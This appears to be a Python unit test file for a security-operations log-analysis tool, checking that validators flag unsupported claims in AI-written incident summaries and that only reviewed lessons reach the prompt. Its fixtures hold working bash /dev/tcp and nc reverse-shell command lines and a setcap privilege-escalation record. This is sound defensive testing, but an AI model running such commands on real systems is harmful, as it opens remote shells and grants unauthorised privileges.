"""Deterministic SOC feedback regression: positive and counterexample coverage."""
import json
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from Core import feedback_learning, feedback_semantics, validator


class Flags:
    def __init__(self):
        self.items = []
    def add(self, check, severity, value, message, section=None):
        self.items.append({'check': check, 'severity': severity, 'value': value,
                           'message': message, 'section': section})


def linux_reverse_event(command='bash -c 0<&53-;exec 53<>/dev/tcp/10.0.255.12/4444;sh <&53 >&53 2>&53'):
    event = {
        'source_kind': 'linux', 'event_id': '1', 'ref': 'E001',
        'timestamp_raw': '2024-05-31T18:01:42.639983000Z',
        'host': 'ip-10-0-255-92', 'user': 'root',
        'fields': {'fields.CommandLine': command, 'fields.DuplicateRawRecords': 2},
    }
    event['raw'] = json.dumps({'raw': command, 'fields': {'CommandLine': command},
                                'duplicate_source_lines': [1, 2], 'UniqueProcessEvents': 1,
                                'provider': 'Linux-Sysmon', 'NetworkConnectionOutcome': 'unknown'})
    return event


def audit_event():
    text = ('2024-08-06T14:36:57Z auditd PROCTITLE ref=E001 '
            'argv=["sudo","setcap","cap_setuid+ep","./priv_esc"] '
            'execution_result=not_available authentication_result=not_available')
    return {'source_kind': 'linux', 'event_id': None, 'ref': 'E001',
            'raw': text, 'fields': {}}


class FeedbackValidatorTests(unittest.TestCase):
    def run_rules(self, sentences, events=None, section='EXECUTIVE SUMMARY'):
        f = Flags()
        feedback_semantics.add_review_requests(f, {section: sentences}, events or [linux_reverse_event()])
        return {x['check'] for x in f.items}

    def test_netcat_hallucination_detected(self):
        self.assertIn('unsupported_command_tool', self.run_rules(
            'A possible connection uses bash and netcat.'))

    def test_netcat_explicit_usage_not_flagged(self):
        ev = linux_reverse_event('bash -c "nc 10.0.255.12 4444"; echo /dev/tcp/10.0.255.12/4444')
        self.assertNotIn('unsupported_command_tool', self.run_rules('Used netcat and bash.', [ev]))

    def test_netcat_negation_not_flagged(self):
        self.assertNotIn('unsupported_command_tool', self.run_rules('No netcat was observed in the provided command.'))

    def test_private_ip_scope_flagged(self):
        self.assertIn('private_ip_scope_review', self.run_rules(
            'Attempted connection to an external IP address (10.0.255.12) on port 4444.'))

    def test_private_ip_correct_scope_not_flagged(self):
        self.assertNotIn('private_ip_scope_review', self.run_rules(
            'The private IP address 10.0.255.12 appears in the command.'))

    def test_private_ip_negative_public_assertion_not_flagged(self):
        self.assertNotIn('private_ip_scope_review', self.run_rules(
            '10.0.255.12 is not an external public IP address.'))

    def test_public_ip_not_flagged(self):
        self.assertNotIn('private_ip_scope_review', self.run_rules(
            'An external IP address 8.8.8.8 was referenced.'))

    def test_successful_network_claim_flagged(self):
        self.assertIn('network_success_not_established', self.run_rules(
            'The reverse shell connection was established to 10.0.255.12:4444.'))

    def test_qualified_connection_not_flagged(self):
        self.assertNotIn('network_success_not_established', self.run_rules(
            'The connection might have been established, but outcome is unknown.'))

    def test_duplicate_overcount_detected(self):
        self.assertIn('duplicate_event_overcount_review', self.run_rules(
            'Two reverse-shell attempts were executed.'))

    def test_duplicate_proper_reporting_not_flagged(self):
        self.assertNotIn('duplicate_event_overcount_review', self.run_rules(
            'Two duplicate raw records represent one unique process creation event.'))

    def test_auditd_administrator_attribution_flag(self):
        self.assertIn('unverified_administrator_attribution', self.run_rules(
            'System administrators executed the command.', [audit_event()]))

    def test_auditd_privilege_success_flag(self):
        self.assertIn('privilege_escalation_outcome_unsupported', self.run_rules(
            'The attacker successfully escalated privileges.', [audit_event()]))

    def test_auditd_benign_assertion_flag(self):
        self.assertIn('unsupported_benign_assessment_review', self.run_rules(
            'The events appear to be benign.', [audit_event()]))

    def test_auditd_qualified_wording_not_flagged(self):
        flags = self.run_rules('PROCTITLE records show a potentially sensitive command; outcome unknown.', [audit_event()])
        self.assertFalse(flags)

    def test_risk_signals_detect_reverse_shell_and_sensitive_command(self):
        self.assertEqual(len(feedback_semantics.additional_risk_signals([linux_reverse_event(), audit_event()])), 2)

    def test_service_unit_domain_filtered_only_in_context(self):
        self.assertTrue(feedback_semantics.is_service_unit_domain(
            'auditd.service', 'argv=["sudo","systemctl","status","auditd.service"]'))
        self.assertFalse(feedback_semantics.is_service_unit_domain(
            'auditd.service', 'HTTP request to https://auditd.service/path'))
        self.assertFalse(feedback_semantics.is_service_unit_domain(
            'example.service', 'A DNS request for example.service'))

    def test_legacy_ioc_context_service_unit_filter_hook(self):
        ev = {'ref': 'E001', 'raw': 'sudo systemctl status auditd.service',
              'host': None, 'user': None, 'source_kind': 'linux', 'meta': {}}
        iocs = validator.ioc_context([ev])
        self.assertFalse(any(x['type'] == 'domain' and x['value'] == 'auditd.service' for x in iocs))

    def test_legacy_validator_integrates_feedback_checks(self):
        ev = linux_reverse_event()
        out = ('## EXECUTIVE SUMMARY\n'
               'A process used bash and netcat to reach external IP address (10.0.255.12).\n'
               '## SUSPICIOUS ACTIVITIES\n- A possible reverse-shell command [E001].\n')
        sections = {'EXECUTIVE SUMMARY': 'A process used bash and netcat to reach external IP address (10.0.255.12).',
                    'SUSPICIOUS ACTIVITIES': '- A possible reverse-shell command [E001].'}
        flags = validator.validate_output(out, sections, [ev], [], [], truncated=False)
        checks = {f['check'] for f in flags}
        self.assertIn('unsupported_command_tool', checks)
        self.assertIn('private_ip_scope_review', checks)


class HumanGatedLearningTests(unittest.TestCase):
    def test_curated_lesson_only_if_kb_contains_allowed_id(self):
        with tempfile.TemporaryDirectory() as d:
            kb = Path(d) / 'kb.json'
            kb.write_text(json.dumps({'schema_version': 'soc-feedback-1', 'validated_lesson_ids':
                                      ['LT03_REVERSE_SHELL', 'UNREVIEWED_PROMPT_INJECTION']}), encoding='utf-8')
            with patch.object(feedback_learning, 'KB_PATH', kb):
                notes = feedback_learning.prompt_guidance([linux_reverse_event()])
                self.assertTrue(any('LT03_REVERSE_SHELL' in n for n in notes))
                self.assertFalse(any('UNREVIEWED_PROMPT_INJECTION' in n for n in notes))
                self.assertTrue(any('no' in n.lower() and 'netcat' in n.lower() for n in notes))

    def test_review_not_needed_for_static_factual_guardrails(self):
        with tempfile.TemporaryDirectory() as d:
            with patch.object(feedback_learning, 'KB_PATH', Path(d)/'missing'):
                notes = feedback_learning.prompt_guidance([linux_reverse_event()])
                self.assertTrue(notes)
                self.assertFalse(any('ANALYST-VALIDATED' in n for n in notes))

    def test_explicit_linux_provider_receives_guidance_even_if_event_kind_generic(self):
        # Week-2 CLI override affects parsed["source_type"] but JSON event kind may
        # remain generic; Linux-Sysmon provider must still activate guidance.
        event = linux_reverse_event()
        event['source_kind'] = 'generic'
        notes = feedback_learning.prompt_guidance([event])
        self.assertTrue(any('netcat' in n for n in notes))

    def test_prompt_guidance_is_added_to_real_orchestrator(self):
        from Core import analysis
        from types import SimpleNamespace
        event = linux_reverse_event()
        event['source_kind'] = 'generic'
        parsed = {
            'events': [event], 'name': 'LT03-demo.json', 'path': 'dummy',
            'sha256': '0' * 64, 'format': 'json', 'compressed': False,
            'source_type': 'linux', 'evidence_class': 'synthetic_fixture',
            'warnings': [],
        }
        capture = []
        def fake_generate(prompt, model=None, options=None, url=None):
            capture.append(prompt)
            return SimpleNamespace(
                text='## EXECUTIVE SUMMARY\nA suspicious reverse-shell command [E001].',
                model=model, options_used=options, attempts=[], retry_used=False,
                done_reason='stop', truncated=False, tokens_per_second=25.0,
                wall_seconds=0.5,
            )
        with patch.object(analysis.ollama_client, 'generate', fake_generate):
            result = analysis.run_task('log_analysis', parsed, options={'num_ctx':8192})
        self.assertEqual(result['review']['status'], 'Pending Review')
        self.assertIn('LOCAL SAFETY RULE', capture[0])
        self.assertIn('netcat', capture[0])
        self.assertTrue(result['prompt']['feedback']['general_guardrails_applied'])
        self.assertEqual(result['input']['source_type'], 'linux')

    def test_windows_case_does_not_receive_linux_guidance(self):
        event = {'source_kind': 'windows', 'raw': 'Sysmon Event ID 1 Image=C:\\Windows\\a.exe', 'ref': 'E001'}
        self.assertFalse(feedback_learning.prompt_guidance([event]))


if __name__ == '__main__':
    unittest.main()
